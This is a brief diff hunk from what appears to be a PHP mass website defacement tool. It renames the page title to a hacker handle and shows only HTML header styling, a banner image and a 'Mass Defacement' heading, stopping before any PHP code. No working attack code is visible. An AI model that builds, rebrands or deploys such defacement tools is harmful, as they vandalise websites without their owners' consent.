@@ -2,7 +2,7 @@
 <link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
 <link href='http://fonts.googleapis.com/css?family=Orbitron' rel='stylesheet' type='text/css'>
 <style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), url(http://cur.cursors-4u.net/cursors/cur-9/cur862.png), progress !important;}</style>
-<title>Mass Deface Priv8</title>
+<title>Mass Deface Trhacknon</title>
 <center><img src="https://b.top4top.io/p_2280mvkvg0.jpg" height="500" width="500"></center>
 <center><font color="white" face="Orbitron"><b>Mass Defacement</td></b></center>
 <?php
